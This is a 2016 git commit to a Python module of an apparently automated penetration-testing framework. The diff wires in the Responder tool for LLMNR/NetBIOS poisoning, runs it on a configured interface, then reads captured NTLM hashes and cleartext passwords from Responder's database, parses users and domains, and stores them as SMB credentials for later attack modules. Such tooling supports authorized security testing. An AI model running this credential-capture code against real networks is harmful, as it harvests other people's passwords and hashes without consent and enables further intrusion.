f776e86259d2db71d0ecc2bc64285cd7622d5dca
Austin Lane <alane@rapid7.com>
2016-09-20 11:36:16 -0500

    Working responder module, may not work with default kali Responder, but definitely works with Responder straight from github repo

--- modules/action/responder.py
+++ modules/action/responder.py
@@ -1,5 +1,9 @@
+import re
+import time
+import datetime
 from core.actionModule import actionModule
 from core.utils import Utils
+from core.keystore import KeyStore as kb
 
 
 class responder(actionModule):
@@ -9,24 +13,64 @@ class responder(actionModule):
         self.shortName = "Responder"
         self.description = "execute [reponder -I eth0 -wrf]"
 
-        self.requirements = ["responder", "disabled"]
+        self.requirements = ["responder"]
         self.triggers = ["always"]
 
-        self.safeLevel = 5
+        self.safeLevel = 3
 
         self.maxThreads = 1
 
     def process(self):
-        temp_file = self.config["proofsDir"] + self.shortName + "_" + Utils.getRandStr(10)
-
-        command = "responder -I eth0 -wrf"
-        # run for 15 minutes
-        # result = Utils.execWait(command, temp_file, timeout=900)
-        result = Utils.execWait(command, temp_file, timeout=60)
+        default_interface = self.config["responder_iface"]
+        default_delay = self.config["responder_delay"]
+        responder_path = self.config["responder_path"]
+        my_ip = self.config["lhost"]
 
         # TODO
         # check to see if we got any creds 
         # if not, wait 5 minutes and run again for 15 minutes
+        # Extract usernames from results and add to KB
+        found_hash = False
+        times_run = 0
+        #while not found_hash and times_run < 4:
+        self.display.output("Starting responder...")
+        temp_file1 = self.config["proofsDir"] + self.shortName + "_" + Utils.getRandStr(10)
+        temp_file2 = self.config["proofsDir"] + self.shortName + "_" + Utils.getRandStr(10)
+        command = "python " + responder_path + "Responder.py -I " + default_interface + " -i " + my_ip + " -wrf"
+        # run for 15 minutes
+        # result = Utils.execWait(command, temp_file, timeout=900)
+        start_time = '{:%d-%m-%Y %H:%M:%S}'.format(datetime.datetime.now())
+        result = Utils.execWait(command, temp_file1, timeout=60)
+        #time.sleep(60)
+        responder_db = responder_path + "Responder.db"
+        command = "sqlite3 " + responder_db + " \"select * from responder where timestamp > '" + start_time + "'\""
+        result = Utils.execWait(command, temp_file2, timeout=10)
+        times_run += 1
+        for part in result.splitlines():
+            found_hash = True #Found a hash, set to true to prevent loop
+            #Looking for output ---
+            #01/01/2001 01:00:00 PM - [HTTP] NTLM[v2/-SSP] Hash     : username::domain:etc...
+            #split by :, limit to 4 splits, take last section
+            record = part.split('|')
+            method = record[1]
+            hashtype = record[2]
+            host = record[3]
+            username = record[5]
+            domain = username.split('\\')[0]
+            user = username.split('\\')[1]
+            cleartext = record[6]
+            shorthash = record[7]
+            fullhash = record[8]
+            self.display.error("Vuln [NetBIOS|LLMNR] Found new hash - ", fullhash)
+            self.addVuln(host, "NetBIOS|LLMNR", {"port": "445", "output": temp_file2.replace("/", "%2F")})
+            kb.add("domain/" + domain + "/" + user + "/" + hashtype + "/" + fullhash)
+            if len(cleartext) > 0:
+                kb.add("creds/" + host + "/445/SMB/" + user + "/" + cleartext)
+
+            #if not found_hash:
+            #    time.sleep(300) # sleep for 5 minutes
 
         # repeat upto 5 4 times
+        if found_hash:
+            self.fire("newNTLMHash")
         return
